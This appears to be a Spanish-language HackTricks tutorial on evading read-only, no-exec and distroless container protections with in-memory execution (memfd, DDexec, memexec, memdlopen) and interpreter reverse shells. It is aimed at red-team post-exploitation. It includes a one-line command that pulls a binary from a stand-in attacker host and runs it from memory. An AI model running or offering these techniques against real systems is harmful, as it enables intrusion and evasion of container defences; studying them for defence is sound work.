# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Videos

En los siguientes videos puedes encontrar las técnicas mencionadas en esta página explicadas con más profundidad:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## escenario read-only / no-exec

Cada vez es más común encontrar máquinas linux montadas con **protección de sistema de archivos de solo lectura (ro)**, especialmente en contenedores. Esto se debe a que ejecutar un contenedor con un sistema de archivos ro es tan sencillo como establecer **`readOnlyRootFilesystem: true`** en el `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Sin embargo, aunque el sistema de archivos esté montado como ro, **`/dev/shm`** seguirá teniendo permisos de escritura, por lo que es falso que no podamos escribir nada en el disco. No obstante, esta carpeta estará **montada con protección no-exec**, por lo que si descargas un binario aquí **no podrás ejecutarlo**.

> [!WARNING]
> Desde la perspectiva de un red team, esto hace que sea **complicado descargar y ejecutar** binarios que no estén ya en el sistema (como backdoors o enumerators como `kubectl`).

## Bypass más sencillo: Scripts

Ten en cuenta que mencioné binarios: puedes **ejecutar cualquier script** siempre que el intérprete esté dentro de la máquina, como un **shell script** si `sh` está presente o un **script de** **python** si `python` está instalado.

Sin embargo, esto no es suficiente para ejecutar tu backdoor binario u otras herramientas binarias que puedas necesitar.

## Bypasses de memoria

Si quieres ejecutar un binario pero el sistema de archivos no lo permite, la mejor forma de hacerlo es **ejecutarlo desde la memoria**, ya que las **protecciones no se aplican allí**.

### Bypass de FD + syscall exec

Si tienes algunos motores de scripting potentes dentro de la máquina, como **Python**, **Perl** o **Ruby**, podrías descargar el binario que quieres ejecutar en la memoria, almacenarlo en un descriptor de archivo de memoria (`create_memfd` syscall), que no estará protegido por esas protecciones, y después llamar a un **`exec` syscall** indicando el **fd como el archivo que se debe ejecutar**.

Para esto puedes utilizar fácilmente el proyecto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puedes pasarle un binario y generará un script en el lenguaje indicado con el **binario comprimido y codificado en b64**, junto con las instrucciones para **decodificarlo y descomprimirlo** en un **fd** creado mediante una llamada al `create_memfd` syscall y una llamada al **exec** syscall para ejecutarlo.

> [!WARNING]
> Esto no funciona en otros lenguajes de scripting como PHP o Node porque no tienen una forma p**or defecto de llamar a raw syscalls** desde un script, por lo que no es posible llamar a `create_memfd` para crear el **memory fd** donde almacenar el binario.
>
> Además, crear un **fd normal** con un archivo en `/dev/shm` no funcionará, ya que no se permitirá ejecutarlo porque se aplicará la **protección no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) es una técnica que permite **modificar la memoria de tu propio proceso** sobrescribiendo su **`/proc/self/mem`**.

Por lo tanto, al **controlar el código assembly** que está siendo ejecutado por el proceso, puedes escribir un **shellcode** y "mutar" el proceso para **ejecutar cualquier código arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** te permitirá cargar y **ejecutar** tu propio **shellcode** o **cualquier binario** desde la **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para obtener más información sobre esta técnica, consulta Github o:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) es el siguiente paso natural de DDexec. Es un **shellcode de DDexec demonizado**, por lo que cada vez que quieras **ejecutar un binario diferente** no necesitas volver a iniciar DDexec; simplemente puedes ejecutar el shellcode de memexec mediante la técnica DDexec y después **comunicarte con este demonio para pasarle nuevos binarios que cargar y ejecutar**.

Puedes encontrar un ejemplo sobre cómo usar **memexec para ejecutar binarios desde un reverse shell de PHP** en [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con un propósito similar al de DDexec, la técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite una **forma más sencilla de cargar binarios** en memoria para ejecutarlos posteriormente. Incluso podría permitir cargar binarios con dependencias.

## Bypass de Distroless

Para obtener una explicación específica de **qué es realmente distroless**, cuándo resulta útil, cuándo no y cómo cambia las técnicas de post-exploitation en contenedores, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Qué es distroless

Los contenedores distroless contienen únicamente los **componentes mínimos necesarios para ejecutar una aplicación o servicio específico**, como bibliotecas y dependencias de runtime, pero excluyen componentes más grandes, como un gestor de paquetes, un shell o utilidades del sistema.

El objetivo de los contenedores distroless es **reducir la superficie de ataque de los contenedores eliminando componentes innecesarios** y minimizando el número de vulnerabilidades que pueden explotarse.

### Reverse Shell

En un contenedor distroless es posible que **ni siquiera encuentres `sh` o `bash`** para obtener un shell normal. Tampoco encontrarás binarios como `ls`, `whoami`, `id`... todo lo que normalmente ejecutas en un sistema.

> [!WARNING]
> Por lo tanto, **no** podrás obtener un **reverse shell** ni **enumerar** el sistema como lo haces habitualmente.

Sin embargo, si el contenedor comprometido está ejecutando, por ejemplo, una aplicación web Flask, entonces Python está instalado y, por lo tanto, puedes obtener un **reverse shell de Python**. Si está ejecutando Node, puedes obtener un rev shell de Node, y lo mismo ocurre con casi cualquier **lenguaje de scripting**.

> [!TIP]
> Usando el lenguaje de scripting podrías **enumerar el sistema** mediante las capacidades del lenguaje.

Si **no existen** protecciones de **`read-only/no-exec`**, podrías aprovechar tu reverse shell para **escribir tus binarios en el sistema de archivos** y **ejecutarlos**.

> [!TIP]
> Sin embargo, en este tipo de contenedores estas protecciones normalmente existirán, pero podrías utilizar las **técnicas anteriores de ejecución en memoria para evadirlas**.

Puedes encontrar **ejemplos** sobre cómo **explotar algunas vulnerabilidades RCE** para obtener **reverse shells** de lenguajes de scripting y ejecutar binarios desde la memoria en [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
